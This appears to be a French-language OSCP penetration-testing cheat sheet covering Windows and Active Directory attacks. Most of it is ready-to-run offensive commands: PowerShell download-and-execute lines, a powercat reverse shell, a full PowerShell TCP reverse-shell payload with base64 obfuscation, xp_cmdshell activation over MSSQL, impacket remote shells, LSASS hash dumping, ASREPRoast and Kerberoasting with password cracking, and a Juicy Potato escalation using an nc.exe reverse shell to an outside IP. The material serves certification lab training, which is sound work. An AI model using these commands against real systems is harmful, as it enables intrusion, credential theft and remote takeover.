<img src="https://github.com/florianges/Simple-OSCP-cheat-sheet/assets/64069514/4f64d883-9cac-4bc5-b1a5-bcb1f488d072" height="180">

## Commande windows:
**Télécharger puis exécuter un fichier:** powershell "IEX (New-Object Net.WebClient).DownloadString('http://[IP]/shell2.ps1')"  
**Télécharger un fichier:** wget http://[IP]/[fichier] -outfile [fichier]  
Ou alors: (new-object System.Net.WebClient).DownloadFile('http://[IP]/shell.exe','C:\Users\Public\shell.exe')  
**Reverse shell via powercat:** IEX(New-Object System.Net.WebClient).DownloadString('http://[IP]/powercat.ps1');powercat -c [IP] -p 4444 -e powershell  
**Historique Powershell:** type C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  
**Information systeme:** systeminfo  
**Lister les infos d'un user:** net user [user]  
**Lister quel groupe / user ont accès au fichier:** icacls [fichier]  
![image](https://github.com/florianges/Simple-OSCP-cheat-sheet/assets/64069514/8a6e9321-9713-4e5f-95c7-f60cb03a49c4)  

**Lister process:** Get-Process | ForEach-Object {$_.Path}  
**Trouver des fichiers (équivalent find):** Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

## Partage Samba:
**Lister tout les partages en anonymous:** smbclient -N -L \\\\[IP]\\  
**Ou:** crackmapexec smb <IP> -u '[user]' -p '[pass]' --shares #Null user  
**avec un compte:** smbclient -L //[IP]/ -U [user] --password=[pass]  
**Lister tout les partages et les droits associés:** smbmap -H [ip]  
**Aller dans un partage:** smbclient -N \\\\[IP]\\[nom_du_partage]  
**Énumération  des services windows:** enum4liux [IP CIBLE]  

## Connexion a Windows Management (port 5985 par défaut) :
•	evil-winrm -i [IP] -u [USER]  

## Commande powershell offusquée:
pwsh  
$Text = '$client = New-Object System.Net.Sockets.TCPClient("[IP]",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'  
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)  
$EncodedText =[Convert]::ToBase64String($Bytes)  
$EncodedText  
exit  

## Executer des commandes via MSQL :  
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth  
EXECUTE sp_configure 'show advanced options', 1;  
RECONFIGURE;  
EXECUTE sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;  
EXECUTE xp_cmdshell 'whoami';  
  
### Quand la commande est trop longue:  
DECLARE @cmd VARCHAR(8000);  
SET @cmd=0x[cmd en hexa];  
EXEC xp_cmdshell @cmd;  

## Utilisation du service RPC :
**Connexion au serveur:** rpcclient -U "[USER]" [IP]  
**Lister les users:** enumdomusers  
**Informations sur un user:** queryuser [user]  
**Transformer le format "enumdomusers" en une liste de user:** cat user.txt | tr -d '[]' | cut -d ' ' -f1 | cut -c6-  
**Lister les groupes:** enumdomgroups  
**Lister les groupe du domaine:** enumalsgroups domain  
**Lister les groupe par défault:** enumalsgroups builtin  
**Lister les SID présent dans un groupe :** queryaliasmem domain [RID]  
**Trouver le nom d'un utilisateur via son SID:** lookupsids [SID]  
**lister les partages NFS:** nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount [IP]  

## Utilisation de impacket :
**shell via un partage samba :** psexec.py [user]@[IP]  
**shell via un partage samba en écriture:** smbexec.py [user]@[IP]  
**shell via Windows Management Instrumentation:** wmiexec.py [user]@[IP]  
**commande via le Planificateur de tâches:** atexec.py [user]@[IP] [commande]  
**connexion à MSQL:**  impacket-mssqlclient [user]@[IP] -windows-auth  

## Bloodhound-python :
sudo neo4j start --> démare neo4j  
bloodhound --no-sandbox --> ouvre bloodhound  
bloodhound-python -d [domain] -u [user] -p [password] -gc [name.domain] -c all -ns [IP] --> récupère les fichiers  
Find Principles with DCSync Rights. --> propose un schéma avec les objets principaux  
Shortest Paths to High value Targets --> propose un schéma avec plus de détail  

## Post énumération (script) :
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe

## Reverse shell :
powershell iex(new-object net.webclient).downloadstring('http://[IP]/shell.ps1')  
Télécharger shell.ps1  

## Récupérer les hash du processus LSASS:
crackmapexec smb 192.168.1.105 -u '[user]' -p '[password]' --lsa

## Attaque sur Kerberos:
### ASREPRoast:
ASREPRoast est une technique qui permet de récupérer le mot de passe Kerberos d'un utilisateur en brutforcant son TGT lorsque que la pré-authentification est désactivé  
récupération du hash d'un compte:  
GetNPUsers.py [domaine]/[user] -request -no-pass -dc-ip [IP]  
Liste des users  
GetNPUsers.py [domaine]/ -dc-ip [IP] -request  
récupération d'un hash avec une wordlist de user:  
GetNPUsers.py [domaine]/ -usersfile [wordlist user] -request -no-pass -dc-ip [IP]  
Bruteforce du hash:  
john [hash file] -wordlist=rockyou.txt  
### Kerberoasting:
Kerberoasting est une technique pour récupérer le mot de passe d'un compte de service en bruteforcant le TGS fournis pour ce service  
récupération du hash:  
GetUserSPNs.py -request -dc-ip [ip] [FQDN]/[user]  
Bruteforce du hash:  
john [hash file] -wordlist=rockyou.txt  

### Juicy Potato:
Dans sa configuration par défaut, Microsoft Windows Serveur a une vulnérabilité critique qui peut permettre l'élévation de privilèges.  
Cette vulnérabilité s'appelle Juicy Potato.  
Les versions de Windows Serveur suivantes sont affectées :  
•	Windows Serveur 2008 R2  
•	Windows Serveur 2012  
•	Windows Serveur 2012 R2  
•	Windows Serveur 2016  
Méthode :  
Uploader le .exe : dowload  
créer un .bat reverse shell:  
echo START C:\inetpub\wwwroot\wordpress\wp-content\nc.exe 10.10.14.69 1111 -e cmd.exe > reverse_shell.bat  
Puis l'exécuter avec Juicy Potato  
PS.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\reverse_shell.bat -l 1337  

## Compiler code C
x86_64-w64-mingw32-gcc file.c -o eploit.exe  
